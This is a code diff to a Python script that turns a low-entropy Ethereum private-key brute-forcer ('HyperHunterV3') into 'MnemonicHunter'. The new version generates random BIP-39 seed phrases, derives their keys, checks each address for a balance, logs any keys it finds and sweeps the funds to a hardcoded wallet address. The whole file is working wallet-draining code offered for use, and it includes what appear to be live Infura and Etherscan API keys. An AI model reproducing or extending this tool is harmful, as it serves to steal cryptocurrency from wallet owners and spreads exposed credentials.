@@ -2,32 +2,32 @@ import concurrent.futures
 import requests
 from web3 import Web3, HTTPProvider
 from eth_account import Account
+from mnemonic import Mnemonic
 from datetime import datetime
 import logging
 import sys
 import time
 import secrets
-import hashlib
 from typing import Optional, List, Tuple
 
 # Setup logging
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s [%(levelname)s] %(message)s',
-    handlers=[logging.FileHandler('hyper_hunter.log'), logging.StreamHandler()]
+    handlers=[logging.FileHandler('mnemonic_hunter.log'), logging.StreamHandler()]
 )
 logger = logging.getLogger(__name__)
 
 # Configuration
 INFURA_URLS = ["https://mainnet.infura.io/v3/1e398ffe7b4b4bfdadf597e0bf40bee8"]  # Add more for rotation
 TO_ADDRESS = "0x0d5F915f1fA947fA28Df6DE4d448115D3D87738c"  # Your wallet
-ETHERSCAN_API_KEY = "5NNG31G2XS6WNQIYA5G8ZCZ82AFURM4936"  # Free at https://etherscan.io/apis
+ETHERSCAN_API_KEY = "N7RR32X8HUWQH9N6GJMTV4441RB5XUARAE"  # Free at https://etherscan.io/apis
 GAS_LIMIT = 21000  # ETH transfer
-GAS_LIMIT_ERC20 = 100000  # ERC-20 transfer
-BATCH_SIZE = 100  # Parallel batch
+BATCH_SIZE = 50  # Parallel batch
 SCAN_DURATION = 3600  # 1 hour, adjust as needed
 RETRY_COUNT = 3  # Network retries
-WORKERS = 4  # Parallel threads, adjust for Orange Pi
+WORKERS = 4  # Parallel threads
+MNEMONIC_STRENGTH = 128  # 12 words (256 for 24 words)
 
 # Initialize Web3 pool
 web3_pool = [Web3(HTTPProvider(url)) for url in INFURA_URLS]
@@ -35,6 +35,9 @@ for w3 in web3_pool:
     if not w3.is_connected():
         logger.error(f"❌ Failed to connect to Infura: {url}")
         sys.exit(1)
+
+# Initialize mnemonic generator
+mnemo = Mnemonic("english")
 
 def get_gas_price() -> int:
     """Fetch dynamic gas price from Etherscan."""
@@ -52,44 +55,22 @@ def get_gas_price() -> int:
             time.sleep(1)
     return Web3.to_wei(20, 'gwei')
 
-def key_to_hex(key_int: int) -> Optional[str]:
-    """Convert integer to 64-char hex key."""
+def generate_mnemonic() -> str:
+    """Generate a random BIP-39 mnemonic."""
+    return mnemo.generate(strength=MNEMONIC_STRENGTH)
+
+def mnemonic_to_private_key(mnemonic: str, path: str = "m/44'/60'/0'/0/0") -> Optional[str]:
+    """Derive private key from mnemonic."""
     try:
-        hex_key = f"0x{key_int:064x}"
-        return hex_key if len(hex_key) == 66 else None
+        seed = mnemo.to_seed(mnemonic)
+        account = Account.from_mnemonic(mnemonic, account_path=path)
+        return account._private_key.hex()
     except Exception:
         return None
-
-def mnemonic_key(seed: str) -> Optional[str]:
-    """Derive key from mnemonic-like seed."""
-    try:
-        seed_bytes = hashlib.sha256(seed.encode()).digest()
-        return f"0x{seed_bytes.hex()[:64]}"
-    except Exception:
-        return None
-
-def generate_keys(batch_size: int) -> List[str]:
-    """Generate low-entropy and mnemonic-derived keys."""
-    keys = []
-    for i in range(batch_size):
-        # Sequential
-        if k := key_to_hex(i):
-            keys.append(k)
-        # Patterns
-        if i % 10 == 0:
-            keys.append(f"0x{'1' * 64}")
-            keys.append(f"0x{'f' * 64}")
-        # Random low-entropy
-        keys.append(f"0x{secrets.token_hex(16):064x}")
-        # Mnemonic-like
-        if k := mnemonic_key(f"key{i}{secrets.token_hex(8)}"):
-            keys.append(k)
-    return [k for k in keys if k]
 
 def private_key_to_address(pk_hex: str) -> Optional[str]:
     """Convert private key to address."""
     try:
-        Account.enable_unaudited_hdwallet_features()
         account = Account.from_key(pk_hex)
         return account.address
     except Exception:
@@ -159,54 +140,56 @@ def sweep_funds(pk_hex: str, from_address: str, w3: Web3) -> bool:
         logger.error(f"Error sweeping {from_address}: {e}")
         return False
 
-def scan_worker(keys: List[str], w3: Web3) -> List[Tuple[str, str, float]]:
-    """Process a batch of keys."""
+def scan_worker(mnemonics: List[str], w3: Web3) -> List[Tuple[str, str, str, float]]:
+    """Process a batch of mnemonics."""
     hits = []
-    for pk_hex in keys:
+    for mnemonic in mnemonics:
+        pk_hex = mnemonic_to_private_key(mnemonic)
+        if not pk_hex:
+            continue
         address = private_key_to_address(pk_hex)
         if not address:
             continue
         total_balance, has_funds = check_balances(address, w3)
         if has_funds:
-            hits.append((pk_hex, address, total_balance))
-            logger.info(f"[FOUND] Address: {address} | Balance: {total_balance:.10f} | Key: {pk_hex}")
+            hits.append((mnemonic, pk_hex, address, total_balance))
+            logger.info(f"[FOUND] Address: {address} | Balance: {total_balance:.10f} | Mnemonic: {mnemonic}")
             with open("hits.txt", "a") as f:
-                f.write(f"[{datetime.utcnow()}] Address: {address} | Balance: {total_balance:.10f} | Key: {pk_hex}\n")
+                f.write(f"[{datetime.utcnow()}] Address: {address} | Balance: {total_balance:.10f} | Mnemonic: {mnemonic} | Key: {pk_hex}\n")
         time.sleep(0.05)  # Micro-delay
     return hits
 
-def hyper_hunter():
-    """Scan and sweep wallets."""
-    logger.info("Starting HyperHunterV3")
+def mnemonic_hunter():
+    """Scan and sweep mnemonic-derived wallets."""
+    logger.info("Starting MnemonicHunter")
     start_time = time.time()
-    key_index = 0
 
     while time.time() - start_time < SCAN_DURATION:
-        keys = generate_keys(BATCH_SIZE)
-        key_index += BATCH_SIZE
+        # Generate mnemonics
+        mnemonics = [generate_mnemonic() for _ in range(BATCH_SIZE)]
 
         # Parallel scanning
         hits = []
         with concurrent.futures.ThreadPoolExecutor(max_workers=WORKERS) as executor:
-            key_batches = [keys[i::WORKERS] for i in range(WORKERS)]
-            futures = [executor.submit(scan_worker, batch, web3_pool[i % len(web3_pool)]) for i, batch in enumerate(key_batches)]
+            mnemonic_batches = [mnemonics[i::WORKERS] for i in range(WORKERS)]
+            futures = [executor.submit(scan_worker, batch, web3_pool[i % len(web3_pool)]) for i, batch in enumerate(mnemonic_batches)]
             for future in concurrent.futures.as_completed(futures):
                 hits.extend(future.result())
 
         # Sweep hits
-        for pk_hex, address, balance in hits:
+        for mnemonic, pk_hex, address, balance in hits:
             if sweep_funds(pk_hex, address, web3_pool[0]):
-                logger.info(f"Swept {balance:.10f} from {address}")
+                logger.info(f"Swept {balance:.10f} from {address} (Mnemonic: {mnemonic})")
             else:
                 logger.error(f"Failed to sweep {address}")
 
         time.sleep(0.1)  # Batch delay
 
-    logger.info("HyperHunterV3 stopped.")
+    logger.info("MnemonicHunter stopped.")
 
 if __name__ == "__main__":
     try:
-        hyper_hunter()
+        mnemonic_hunter()
     except KeyboardInterrupt:
-        logger.info("HyperHunterV3 stopped by user.")
+        logger.info("MnemonicHunter stopped by user.")
         sys.exit(0)
